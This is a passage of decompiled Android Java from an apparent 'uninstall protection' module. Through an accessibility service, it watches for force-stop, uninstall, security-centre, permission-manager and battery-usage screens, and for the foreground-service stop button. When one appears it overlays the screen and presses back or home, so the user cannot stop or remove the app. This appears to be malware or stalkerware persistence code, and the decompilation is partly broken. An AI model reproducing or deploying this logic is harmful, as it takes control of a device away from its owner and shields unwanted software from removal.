                                                                            z2 = true;
                                                                            if (AbstractC0779a1.m213652a5(strM213295i2, AbstractC0779a1.m213687e0((String) r21).toString(), true)) {
                                                                                str9 = r21;
                                                                                break;
                                                                            } else {
                                                                                arrayList3 = arrayList;
                                                                                i9 = i10;
                                                                            }
                                                                        }
                                                                        String str15 = str9;
                                                                        if (str15 != null) {
                                                                            t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [轮询#" + c0355a02.f53700d5 + "] ✅ 强行停止页: " + str8 + " + " + str15 + " → 遮挡+返回!");
                                                                            c0355a02.m211951e5();
                                                                            handler7.postAtFrontOfQueue(new nk1(c0355a02, 10));
                                                                            C0355a0.m211925c4(c0355a02);
                                                                            c0355a03 = c0355a02;
                                                                            try {
                                                                                c0355a03.m211945d9("POLLING_FORCE_STOP", "轮询-强行停止拦截", AbstractC0716jf.m213306g5(str3, str8, str15), "遮挡+返回", str3);
                                                                                try {
                                                                                    accessibilityNodeInfo.recycle();
                                                                                    return;
                                                                                } catch (Exception unused5) {
                                                                                    return;
                                                                                }
                                                                            } catch (Exception e19) {
                                                                                e = e19;
                                                                                pk1Var = this;
                                                                                Object obj8 = accessibilityNodeInfo;
                                                                                obj6 = obj8;
                                                                                j = j3;
                                                                                handler = handler3;
                                                                                r6 = obj6;
                                                                                t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                                                                if (r6 != 0) {
                                                                                }
                                                                                handler.postDelayed(pk1Var, j);
                                                                            }
                                                                        }
                                                                        c0355a03 = c0355a02;
                                                                    }
                                                                    ArrayList arrayList4 = arrayList;
                                                                    t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🔎 搜索APP名: " + AbstractC0715je.m213295i2(arrayList4, null, null, null, null, 63) + " (前台: " + str3 + ")");
                                                                    size = arrayList4.size();
                                                                    i = 0;
                                                                    accessibilityNodeInfo = accessibilityNodeInfo;
                                                                    while (i < size) {
                                                                        Object obj9 = arrayList4.get(i);
                                                                        int i11 = i + 1;
                                                                        String string2 = AbstractC0779a1.m213687e0((String) obj9).toString();
                                                                        if (string2.length() >= 2) {
                                                                            ?? r7 = accessibilityNodeInfo;
                                                                            try {
                                                                                try {
                                                                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = r7.findAccessibilityNodeInfosByText(string2);
                                                                                    if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                                                                                        i2 = size;
                                                                                        charSequence4 = charSequence;
                                                                                        z3 = z2;
                                                                                        accessibilityNodeInfo3 = r7;
                                                                                        charSequence3 = charSequence2;
                                                                                    } else {
                                                                                        try {
                                                                                            i2 = size;
                                                                                        } catch (Exception unused6) {
                                                                                            i2 = size;
                                                                                        }
                                                                                        try {
                                                                                            t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [轮询#" + c0355a03.f53700d5 + "] ✅ 找到APP: " + string2 + " (" + listFindAccessibilityNodeInfosByText.size() + "个节点) → 遮挡+返回!");
                                                                                            Iterator it8 = listFindAccessibilityNodeInfosByText.iterator();
                                                                                            while (it8.hasNext()) {
                                                                                                try {
                                                                                                    try {
                                                                                                        ((AccessibilityNodeInfo) it8.next()).recycle();
                                                                                                    } catch (Exception unused7) {
                                                                                                    }
                                                                                                } catch (Throwable th11) {
                                                                                                    th = th11;
                                                                                                    r6 = r7;
                                                                                                    if (r6 != 0) {
                                                                                                    }
                                                                                                    throw th;
                                                                                                }
                                                                                            }
                                                                                            String str16 = c0355a03.f53687c2;
                                                                                            if (str16 == null) {
                                                                                                str16 = "";
                                                                                            }
                                                                                            c0355a03.m211951e5();
                                                                                            if (!AbstractC0779a1.m213652a5(str3, charSequence, false)) {
                                                                                                try {
                                                                                                    try {
                                                                                                        try {
                                                                                                            if (AbstractC0779a1.m213652a5(str3, "safecenter", false)) {
                                                                                                                charSequence3 = charSequence2;
                                                                                                            } else {
                                                                                                                charSequence3 = charSequence2;
                                                                                                                try {
                                                                                                                    if (!AbstractC0779a1.m213652a5(str3, charSequence3, false) && !AbstractC0779a1.m213652a5(str3, "appmanager", false) && !AbstractC0779a1.m213652a5(str3, "permissionmanager", false) && !C0355a0.m211934d7(str3)) {
                                                                                                                        z4 = false;
                                                                                                                    }
                                                                                                                    if (z4) {
                                                                                                                        i3 = i11;
                                                                                                                        charSequence4 = charSequence;
                                                                                                                    } else {
                                                                                                                        i3 = i11;
                                                                                                                        try {
                                                                                                                            charSequence4 = charSequence;
                                                                                                                            try {
                                                                                                                                handler7.postAtFrontOfQueue(new nk1(c0355a03, 11));
                                                                                                                            } catch (Exception unused8) {
                                                                                                                                accessibilityNodeInfo3 = r7;
                                                                                                                                z3 = true;
                                                                                                                                int i12 = i2;
                                                                                                                                accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                                                                                                size = i12;
                                                                                                                                i = i3;
                                                                                                                                z2 = z3;
                                                                                                                                charSequence = charSequence4;
                                                                                                                                charSequence2 = charSequence3;
                                                                                                                                accessibilityNodeInfo = accessibilityNodeInfo2;
                                                                                                                            }
                                                                                                                        } catch (Exception unused9) {
                                                                                                                            charSequence4 = charSequence;
                                                                                                                            accessibilityNodeInfo3 = r7;
                                                                                                                            z3 = true;
                                                                                                                            int i122 = i2;
                                                                                                                            accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                                                                                            size = i122;
                                                                                                                            i = i3;
                                                                                                                            z2 = z3;
                                                                                                                            charSequence = charSequence4;
                                                                                                                            charSequence2 = charSequence3;
                                                                                                                            accessibilityNodeInfo = accessibilityNodeInfo2;
                                                                                                                        }
                                                                                                                    }
                                                                                                                    C0355a0.m211925c4(c0355a03);
                                                                                                                    List listM213306g52 = AbstractC0716jf.m213306g5(str16, string2);
                                                                                                                    accessibilityNodeInfo3 = r7;
                                                                                                                    z3 = true;
                                                                                                                    c0355a03.m211945d9("POLLING_DETECT", "轮询检测到APP", listM213306g52, !z4 ? "遮挡+返回" : "返回", str3);
                                                                                                                    accessibilityNodeInfo3.recycle();
                                                                                                                    return;
                                                                                                                } catch (Exception unused10) {
                                                                                                                    i3 = i11;
                                                                                                                    charSequence4 = charSequence;
                                                                                                                    accessibilityNodeInfo3 = r7;
                                                                                                                    z3 = true;
                                                                                                                    int i1222 = i2;
                                                                                                                    accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                                                                                    size = i1222;
                                                                                                                    i = i3;
                                                                                                                    z2 = z3;
                                                                                                                    charSequence = charSequence4;
                                                                                                                    charSequence2 = charSequence3;
                                                                                                                    accessibilityNodeInfo = accessibilityNodeInfo2;
                                                                                                                }
                                                                                                            }
                                                                                                            accessibilityNodeInfo3.recycle();
                                                                                                            return;
                                                                                                        } catch (Exception unused11) {
                                                                                                            return;
                                                                                                        }
                                                                                                        c0355a03.m211945d9("POLLING_DETECT", "轮询检测到APP", listM213306g52, !z4 ? "遮挡+返回" : "返回", str3);
                                                                                                    } catch (Exception unused12) {
                                                                                                    }
                                                                                                    z4 = true;
                                                                                                    if (z4) {
                                                                                                    }
                                                                                                    C0355a0.m211925c4(c0355a03);
                                                                                                    List listM213306g522 = AbstractC0716jf.m213306g5(str16, string2);
                                                                                                    accessibilityNodeInfo3 = r7;
                                                                                                    z3 = true;
                                                                                                } catch (Exception unused13) {
                                                                                                    charSequence3 = charSequence2;
                                                                                                }
                                                                                            }
                                                                                        } catch (Exception unused14) {
                                                                                            charSequence4 = charSequence;
                                                                                            accessibilityNodeInfo3 = r7;
                                                                                            charSequence3 = charSequence2;
                                                                                            z3 = true;
                                                                                            i3 = i11;
                                                                                            int i12222 = i2;
                                                                                            accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                                                            size = i12222;
                                                                                            i = i3;
                                                                                            z2 = z3;
                                                                                            charSequence = charSequence4;
                                                                                            charSequence2 = charSequence3;
                                                                                            accessibilityNodeInfo = accessibilityNodeInfo2;
                                                                                        }
                                                                                    }
                                                                                } catch (Throwable th12) {
                                                                                    th = th12;
                                                                                    pk1Var = r7;
                                                                                    r6 = pk1Var;
                                                                                    if (r6 != 0) {
                                                                                    }
                                                                                    throw th;
                                                                                }
                                                                            } catch (Exception unused15) {
                                                                                i2 = size;
                                                                                charSequence4 = charSequence;
                                                                                z3 = z2;
                                                                                accessibilityNodeInfo3 = r7;
                                                                                charSequence3 = charSequence2;
                                                                            }
                                                                            i3 = i11;
                                                                            int i122222 = i2;
                                                                            accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                                            size = i122222;
                                                                            i = i3;
                                                                            z2 = z3;
                                                                            charSequence = charSequence4;
                                                                        } else {
                                                                            charSequence3 = charSequence2;
                                                                            accessibilityNodeInfo2 = accessibilityNodeInfo;
                                                                            size = size;
                                                                            i = i11;
                                                                        }
                                                                        charSequence2 = charSequence3;
                                                                        accessibilityNodeInfo = accessibilityNodeInfo2;
                                                                    }
                                                                    AccessibilityNodeInfo accessibilityNodeInfo4 = accessibilityNodeInfo;
                                                                    t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ❌ 本轮未检测到 (前台: " + str3 + ")");
                                                                    accessibilityNodeInfo4.recycle();
                                                                    pk1Var = this;
                                                                    j = j3;
                                                                    handler = handler3;
                                                                } catch (Exception e20) {
                                                                    e = e20;
                                                                    c0355a03 = c0355a02;
                                                                }
                                                                handler.postDelayed(pk1Var, j);
                                                            }
                                                        }
                                                        charSequence2 = "securitycenter";
                                                        c0355a03 = c0355a02;
                                                        arrayList = arrayList3;
                                                        z2 = true;
                                                        ArrayList arrayList42 = arrayList;
                                                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🔎 搜索APP名: " + AbstractC0715je.m213295i2(arrayList42, null, null, null, null, 63) + " (前台: " + str3 + ")");
                                                        size = arrayList42.size();
                                                        i = 0;
                                                        accessibilityNodeInfo = accessibilityNodeInfo;
                                                        while (i < size) {
                                                        }
                                                        AccessibilityNodeInfo accessibilityNodeInfo42 = accessibilityNodeInfo;
                                                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ❌ 本轮未检测到 (前台: " + str3 + ")");
                                                        accessibilityNodeInfo42.recycle();
                                                        pk1Var = this;
                                                        j = j3;
                                                        handler = handler3;
                                                        handler.postDelayed(pk1Var, j);
                                                    }
                                                }
                                                if (!AbstractC0779a1.m213652a5(str3, charSequence, false)) {
                                                }
                                                it = dh0.m212603a2().iterator();
                                                while (true) {
                                                    if (it.hasNext()) {
                                                    }
                                                    it = it2;
                                                }
                                                str8 = str7;
                                                if (str8 != null) {
                                                }
                                                charSequence2 = "securitycenter";
                                                c0355a03 = c0355a02;
                                                arrayList = arrayList3;
                                                z2 = true;
                                                ArrayList arrayList422 = arrayList;
                                                t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🔎 搜索APP名: " + AbstractC0715je.m213295i2(arrayList422, null, null, null, null, 63) + " (前台: " + str3 + ")");
                                                size = arrayList422.size();
                                                i = 0;
                                                accessibilityNodeInfo = accessibilityNodeInfo;
                                                while (i < size) {
                                                }
                                                AccessibilityNodeInfo accessibilityNodeInfo422 = accessibilityNodeInfo;
                                                t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ❌ 本轮未检测到 (前台: " + str3 + ")");
                                                accessibilityNodeInfo422.recycle();
                                                pk1Var = this;
                                                j = j3;
                                                handler = handler3;
                                                handler.postDelayed(pk1Var, j);
                                            } catch (Throwable th13) {
                                                th = th13;
                                                pk1Var = accessibilityNodeInfo;
                                            }
                                            Iterator it9 = AbstractC0716jf.m213306g5("高耗电", "高功耗", "后台耗电", "耗电异常", "耗电过快", "后台高耗电", "电量消耗", "电池", "耗电详情", "后台活动", "允许后台活动").iterator();
                                            while (true) {
                                                if (!it9.hasNext()) {
                                                    handler3 = handler6;
                                                    next = null;
                                                    break;
                                                }
                                                try {
                                                    next = it9.next();
                                                    it3 = it9;
                                                    handler3 = handler6;
                                                } catch (Exception e21) {
                                                    e = e21;
                                                    handler3 = handler6;
                                                }
                                                try {
                                                    if (!AbstractC0779a1.m213652a5(strM213295i2, (String) next, true)) {
                                                        it9 = it3;
                                                        handler6 = handler3;
                                                    }
                                                } catch (Exception e22) {
                                                    e = e22;
                                                    pk1Var = this;
                                                    c0355a03 = c0355a02;
                                                    obj6 = r9;
                                                    j = j3;
                                                    handler = handler3;
                                                    r6 = obj6;
                                                    t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                                    if (r6 != 0) {
                                                    }
                                                    handler.postDelayed(pk1Var, j);
                                                }
                                            }
                                            Handler handler72 = handler4;
                                        }
                                        pk1Var = this;
                                        c0355a03 = c0355a02;
                                        obj5 = r9;
                                        handler = handler6;
                                        j = j3;
                                        r6 = obj5;
                                        t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                        if (r6 != 0) {
                                            try {
                                                r6.recycle();
                                            } catch (Exception unused16) {
                                            }
                                        }
                                        handler.postDelayed(pk1Var, j);
                                    }
                                    t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [轮询#" + c0355a0.f53700d5 + "] ✅ 命中高危关键词: " + str5 + " → 执行返回!");
                                    c0355a0.m211951e5();
                                    C0355a0.m211925c4(c0355a0);
                                    c0355a03 = c0355a0;
                                    try {
                                        c0355a03.m211945d9("POLLING_HIGH_RISK", "轮询-高危关键词", AbstractC0716jf.m213306g5(str3, str5), "返回+HOME", str3);
                                        try {
                                            r9.recycle();
                                            return;
                                        } catch (Exception unused17) {
                                            return;
                                        }
                                    } catch (Exception e23) {
                                        e = e23;
                                    }
                                    pk1Var = this;
                                    obj5 = r9;
                                    handler = handler6;
                                    j = j3;
                                    r6 = obj5;
                                    t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                                    if (r6 != 0) {
                                    }
                                    handler.postDelayed(pk1Var, j);
                                }
                                z = true;
                                r8.recycle();
                                return;
                            } catch (Exception unused18) {
                                return;
                            }
                            if (AbstractC0779a1.m213652a5(lowerCase, "launcher", false)) {
                            }
                            String str112 = lowerCase;
                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🏠 已回到桌面: " + str112 + " → 停止轮询");
                            c0355a03.m211951e5();
                        } catch (Throwable th14) {
                            th = th14;
                        }
                        handler4 = handler5;
                        lowerCase = "";
                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] 🔍 前台包名: " + lowerCase + " (已运行" + jCurrentTimeMillis + "ms)");
                    } catch (Throwable th15) {
                        th = th15;
                        pk1Var = r8;
                    }
                }
            }
            j2 = j4;
            handler2 = handler6;
            try {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠ rootNode为空 (已运行" + jCurrentTimeMillis + "ms)");
                pk1Var = this;
                j = j2;
                handler = handler2;
                try {
                    handler.postDelayed(pk1Var, j);
                } catch (Exception e24) {
                    e = e24;
                    r6 = 0;
                    t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                    if (r6 != 0) {
                    }
                    handler.postDelayed(pk1Var, j);
                }
            } catch (Exception e25) {
                e = e25;
                pk1Var = this;
                j = j2;
                handler = handler2;
                r6 = 0;
                t60.m214726f4("UninstallProtectionMgr", "🛡️ [轮询#" + c0355a03.f53700d5 + "] ⚠️ 异常: " + e.getMessage());
                if (r6 != 0) {
                }
                handler.postDelayed(pk1Var, j);
            } catch (Throwable th16) {
                th = th16;
                r6 = 0;
                if (r6 != 0) {
                }
                throw th;
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:67:0x00fb A[Catch: all -> 0x005a, Exception -> 0x0065, TryCatch #10 {all -> 0x005a, blocks: (B:30:0x0049, B:35:0x005f, B:39:0x006a, B:42:0x0073, B:43:0x0085, B:45:0x008b, B:47:0x0097, B:50:0x009e, B:58:0x00db, B:59:0x00df, B:61:0x00e5, B:62:0x00eb, B:53:0x00ae, B:55:0x00b4, B:57:0x00c3, B:64:0x00ef, B:65:0x00f5, B:67:0x00fb, B:69:0x0107, B:72:0x010e, B:73:0x0112, B:75:0x0118, B:76:0x011e, B:78:0x0122, B:80:0x0128, B:83:0x0130, B:84:0x0134, B:86:0x013a, B:87:0x0140, B:89:0x0144), top: B:116:0x0049 }] */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfo;
        String string;
        Iterator it;
        w00 w00Var;
        switch (this.f59300a0) {
            case 0:
                m214293a0();
                return;
            case 1:
                C0355a0 c0355a0 = this.f59301a1;
                dqtvuisjd dqtvuisjdVar = c0355a0.f53666a1;
                dqtvuisjd dqtvuisjdVar2 = c0355a0.f53665a0;
                w00 w00Var2 = c0355a0.f53695d0;
                if (w00Var2 == null || (accessibilityNodeInfo = (AccessibilityNodeInfo) w00Var2.invoke()) == null) {
                    return;
                }
                try {
                    try {
                        string = dqtvuisjdVar2.getPackageManager().getApplicationLabel(dqtvuisjdVar2.getApplicationInfo()).toString();
                    } catch (Exception unused) {
                        string = "";
                    }
                    try {
                        if (string.length() != 0) {
                            if (Build.VERSION.SDK_INT >= 31) {
                                for (String str : AbstractC0716jf.m213306g5("com.android.systemui:id/fgs_manager_app_item_stop_button", "com.android.systemui:id/stop_button", "com.android.systemui:id/btn_stop")) {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
                                    if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                        ArrayList arrayList = new ArrayList();
                                        int i = 0;
                                        C0355a0.m211924b9(0, accessibilityNodeInfo, arrayList);
                                        if (!arrayList.isEmpty()) {
                                            int size = arrayList.size();
                                            while (true) {
                                                if (i < size) {
                                                    Object obj = arrayList.get(i);
                                                    i++;
                                                    if (AbstractC0779a1.m213652a5((String) obj, string, true)) {
                                                        t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [FGS保护] 检测到前台服务停止按钮且包含本应用，返回桌面");
                                                        dqtvuisjdVar.performGlobalAction(2);
                                                        c0355a0.m211945d9("FGS_STOP_PROTECT", "FGS停止按钮", AbstractC1117qo.m214451e7(str), "HOME", "com.android.systemui");
                                                    }
                                                }
                                            }
                                        }
                                        Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                                        while (it2.hasNext()) {
                                            try {
                                                ((AccessibilityNodeInfo) it2.next()).recycle();
                                            } catch (Exception unused2) {
                                            }
                                        }
                                    }
                                }
                                it = dh0.f55768b8.iterator();
                                while (true) {
                                    if (it.hasNext()) {
                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) it.next());
                                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                                            while (it3.hasNext()) {
                                                try {
                                                    ((AccessibilityNodeInfo) it3.next()).recycle();
                                                } catch (Exception unused3) {
                                                }
                                            }
                                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(string);
                                            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                                Iterator<T> it4 = listFindAccessibilityNodeInfosByText2.iterator();
                                                while (it4.hasNext()) {
                                                    try {
                                                        ((AccessibilityNodeInfo) it4.next()).recycle();
                                                    } catch (Exception unused4) {
                                                    }
                                                }
                                                t60.m214726f4("UninstallProtectionMgr", "🛡️ [运行服务弹窗] 检测到「正在运行的服务」弹窗包含本应用(" + string + ")，返回桌面");
                                                dqtvuisjdVar.performGlobalAction(2);
                                            }
                                        }
                                    }
                                }
                            } else {
                                it = dh0.f55768b8.iterator();
                                while (true) {
                                    if (it.hasNext()) {
                                    }
                                }
                            }
                        }
                    } catch (Exception unused5) {
                    }
                    try {
                        accessibilityNodeInfo.recycle();
                        return;
                    } catch (Exception unused6) {
                        return;
                    }
                } finally {
                    try {
                        accessibilityNodeInfo.recycle();
                    } catch (Exception unused7) {
                    }
                }
            case 2:
                C0355a0 c0355a02 = this.f59301a1;
                AccessibilityNodeInfo accessibilityNodeInfo2 = null;
                try {
                    try {
                        w00Var = c0355a02.f53695d0;
                    } catch (Exception unused8) {
                        return;
                    }
                } catch (Exception unused9) {
                } catch (Throwable th) {
                    th = th;
                }
                if (w00Var != null) {
                    accessibilityNodeInfo = (AccessibilityNodeInfo) w00Var.invoke();
                    if (accessibilityNodeInfo == null) {
                        return;
                    }
                    try {
                        C0355a0.m211908a2(c0355a02, accessibilityNodeInfo);
                    } catch (Exception unused10) {
                        accessibilityNodeInfo2 = accessibilityNodeInfo;
                        if (accessibilityNodeInfo2 != null) {
                            accessibilityNodeInfo2.recycle();
                            return;
                        }
                        return;
                    } catch (Throwable th2) {
                        th = th2;
                        accessibilityNodeInfo2 = accessibilityNodeInfo;
                        if (accessibilityNodeInfo2 != null) {
                            try {
                                accessibilityNodeInfo2.recycle();
                            } catch (Exception unused11) {
                            }
                        }
                        throw th;
                    }
                    return;
                }
                return;
            default:
                this.f59301a1.m211946e0();
                return;
        }
    }
}
